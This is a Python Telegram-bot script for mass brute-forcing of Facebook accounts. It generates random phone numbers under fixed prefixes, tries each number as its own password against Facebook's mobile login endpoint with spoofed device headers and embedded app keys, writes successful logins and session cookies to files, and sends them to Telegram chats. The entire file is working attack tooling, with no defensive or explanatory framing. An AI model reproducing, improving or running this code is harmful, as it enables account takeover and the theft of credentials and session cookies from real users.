import sys
import os
import subprocess
import time
import random
import uuid
import json
import asyncio
import threading
import requests
from threading import Lock

# ---- Dependency bootstrap ----
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
    from telegram import Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ---- Env config ----
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
if not BOT_TOKEN or not CHAT_ID:
    print("Set BOT_TOKEN and CHAT_ID env vars, boss man.")
    sys.exit(1)
CHAT_ID = int(CHAT_ID)

# ---- Runtime state ----
lock = Lock()
state = {
    "running": False,
    "token": None,          # output forward token
    "chat_id": None,        # output forward chat
    "prefix": None,         # 0750 etc.
    "seen": set(),
    "ok": 0,
    "cp": 0,
    "loop": 0,
    "attempts": 0,
}
stop_event = threading.Event()
worker_thread = None
HITS_FILE = "hits.txt"
CP_FILE = "cp.txt"

# ---- Telegram helpers ----
def tg_send(text, chat=None, token=None):
    chat = chat or CHAT_ID
    token = token or BOT_TOKEN
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={"chat_id": chat, "text": text},
            timeout=10,
        )
    except Exception:
        pass

# ---- Payload builder (same as original) ----
def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    ts = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{ts}:{password}"
    return {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }

# ---- One attempt ----
def crack_one(ids, pw):
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Length": "0",
        "Origin": "https://m.facebook.com",
        "Referer": "https://m.facebook.com/?deoia=1",
        "Sec-CH-UA": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": '"Android"',
        "Sec-CH-UA-Platform-Version": '"10.0.0"',
        "Sec-CH-UA-Model": '"STK-L21"',
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Dest": "empty",
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-friendly-name": "authenticate",
        "x-fb-http-engine": "Liger",
        "x-fb-client-ip": "True",
        "x-fb-server-cluster": "True",
    }
    data = pm(ids, pw)
    try:
        req = requests.post("https://b-graph.facebook.com/auth/login",
                            headers=headers, data=data, timeout=15).json()
    except Exception:
        return "dead"

    if "session_key" in req:
        cookies = req.get("session_cookies", [])
        cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies) if cookies else ""
        with lock:
            state["ok"] += 1
        line = f"{ids} | {pw} | {cookie_str}"
        with open(HITS_FILE, "a") as f:
            f.write(line + "\n")
        tg_send(f"OK\n{ids}\n{pw}\n{cookie_str}")
        return "ok"
    elif "www.facebook.com" in req.get("error", {}).get("message", ""):
        with lock:
            state["cp"] += 1
        with open(CP_FILE, "a") as f:
            f.write(f"{ids}|{pw}\n")
        tg_send(f"CP\n{ids}\n{pw}")
        return "cp"
    return "no"

# ---- Worker loop ----
def worker():
    global state
    while not stop_event.is_set():
        if not state["running"] or not state["prefix"]:
            time.sleep(1)
            continue
        # build a new id
        nmp = "".join(random.choice("1234509876") for _ in range(7))
        with lock:
            if nmp in state["seen"]:
                continue
            state["seen"].add(nmp)
        ids = state["prefix"] + nmp
        with lock:
            state["loop"] += 1
            state["attempts"] += 1
        # try a few retries like original
        for _ in range(3):
            if stop_event.is_set():
                return
            r = crack_one(ids, ids)
            if r in ("ok", "cp"):
                break
        time.sleep(0.2)

def ensure_worker():
    global worker_thread
    if worker_thread is None or not worker_thread.is_alive():
        worker_thread = threading.Thread(target=worker, daemon=True)
        worker_thread.start()

# ---- Telegram handlers ----
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    ensure_worker()
    await update.message.reply_text(
        "Axiom online, boss man.\n\n"
        "/setprefix <0750|0770|0780|0781|0751>\n"
        "/setoutput <token> <chat_id>   (optional forward)\n"
        "/run  - start cracking\n"
        "/stop - halt\n"
        "/stats\n"
        "/hits - download hits.txt\n"
        "/cp   - download cp.txt"
    )

async def cmd_setprefix(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    if not ctx.args or ctx.args[0] not in ("0750","0770","0780","0781","0751"):
        await update.message.reply_text("Usage: /setprefix 0750 (or 0770/0780/0781/0751)")
        return
    with lock:
        state["prefix"] = ctx.args[0]
    await update.message.reply_text(f"Prefix set: {ctx.args[0]}")

async def cmd_setoutput(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    if len(ctx.args) < 2:
        await update.message.reply_text("Usage: /setoutput <token> <chat_id>")
        return
    with lock:
        state["token"] = ctx.args[0]
        state["chat_id"] = ctx.args[1]
    await update.message.reply_text("Output forward set.")

async def cmd_run(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    if not state["prefix"]:
        await update.message.reply_text("Set a prefix first: /setprefix 0750")
        return
    ensure_worker()
    with lock:
        state["running"] = True
    await update.message.reply_text("Running. Fuck yeah.")

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    with lock:
        state["running"] = False
    await update.message.reply_text("Stopped.")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    s = state
    await update.message.reply_text(
        f"State: {'RUNNING' if s['running'] else 'STOPPED'}\n"
        f"Prefix: {s['prefix']}\n"
        f"Attempts: {s['attempts']}\n"
        f"OK: {s['ok']}\n"
        f"CP: {s['cp']}\n"
        f"Loops: {s['loop']}"
    )

async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    try:
        with open(HITS_FILE, "rb") as f:
            await update.message.reply_document(document=f, filename=HITS_FILE)
    except FileNotFoundError:
        await update.message.reply_text("No hits yet.")

async def cmd_cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    try:
        with open(CP_FILE, "rb") as f:
            await update.message.reply_document(document=f, filename=CP_FILE)
    except FileNotFoundError:
        await update.message.reply_text("No CP entries yet.")

# ---- Main ----
def main():
    ensure_worker()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("setprefix", cmd_setprefix))
    app.add_handler(CommandHandler("setoutput", cmd_setoutput))
    app.add_handler(CommandHandler("run", cmd_run))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("hits", cmd_hits))
    app.add_handler(CommandHandler("cp", cmd_cp))
    print("Bot polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
